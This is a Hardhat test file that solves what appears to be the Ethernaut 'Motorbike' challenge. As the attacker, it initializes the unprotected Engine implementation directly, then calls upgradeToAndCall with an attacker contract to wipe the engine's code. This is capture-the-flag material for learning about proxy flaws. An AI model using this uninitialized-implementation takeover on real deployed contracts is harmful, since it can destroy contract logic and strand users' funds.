import { TransactionResponse } from "@ethersproject/providers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";

const CONTRACT_NAME = "Motorbike";
const ATTACKER_NAME = "MotorbikeAttacker";

describe(CONTRACT_NAME, () => {
  let _owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  let engine: Contract;
  let attackerContract: Contract;
  let tx: TransactionResponse;

  beforeEach(async () => {
    [_owner, attacker] = await ethers.getSigners();

    const engineFactory = await ethers.getContractFactory("Engine");
    engine = await engineFactory.deploy();
    await engine.deployed();

    const factory = await ethers.getContractFactory(CONTRACT_NAME);
    contract = await factory.deploy(engine.address);
    await contract.deployed();

    contract = contract.connect(attacker);
    engine = engine.connect(attacker);
  });

  it("Solves the challenge", async () => {
    const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
    attackerContract = await attackerFactory.connect(attacker).deploy();
    await attackerContract.deployed();

    tx = await engine.initialize();
    await tx.wait();

    const iface = new ethers.utils.Interface(["function attack()"]);
    const data = iface.encodeFunctionData("attack");

    tx = await engine.upgradeToAndCall(attackerContract.address, data);
    await tx.wait();

    const code = await ethers.provider.getCode(engine.address);
    expect(code).to.eq("0x");
  });
});
